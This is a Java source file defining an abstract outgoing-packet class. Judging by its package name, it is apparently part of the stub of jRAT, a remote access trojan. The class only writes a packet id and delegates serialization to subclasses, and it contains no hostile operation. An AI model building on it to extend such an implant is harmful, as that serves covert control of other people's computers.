package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public abstract class AbstractOutgoingPacket {

	public abstract void write(DataOutputStream dos, StringWriter sw) throws Exception;

	public abstract byte getPacketId();

	public synchronized final void send(DataOutputStream dos, StringWriter sw) {
		try {
			dos.writeShort(getPacketId());
			this.write(dos, sw);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
